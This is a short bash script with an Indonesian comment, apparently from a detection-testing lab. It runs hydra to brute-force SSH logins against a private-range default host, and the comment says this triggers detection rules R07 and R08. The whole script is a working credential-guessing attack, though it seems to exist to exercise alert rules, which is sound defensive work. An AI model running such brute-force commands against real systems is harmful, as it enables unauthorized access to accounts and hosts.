#!/usr/bin/env bash
# Akses awal: brute force SSH (memicu R07, lalu R08 bila kata sandi ditemukan).
TARGET="${1:-172.30.0.11}"
hydra -L wordlists/users.txt -P wordlists/passwords.txt -t 4 -f -V "ssh://$TARGET"
